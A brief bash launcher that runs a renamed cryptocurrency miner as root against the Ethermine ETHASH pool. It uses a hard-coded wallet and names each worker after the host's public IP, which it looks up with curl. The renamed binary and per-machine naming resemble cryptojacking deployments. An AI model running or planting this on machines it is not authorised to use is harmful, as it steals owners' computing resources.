#!/bin/bash

POOL=us1.ethermine.org:4444
WALLET=0xbfa37cf315fd949634b0a2f4ccfa6b458bdb5203.$(echo "$(curl -s ifconfig.me)" | tr . _ )-anhduongbmt
cd "$(dirname "$0")"

chmod +x ./anhduongbmt && sudo ./anhduongbmt --algo ETHASH --pool $POOL --user $WALLET  $@
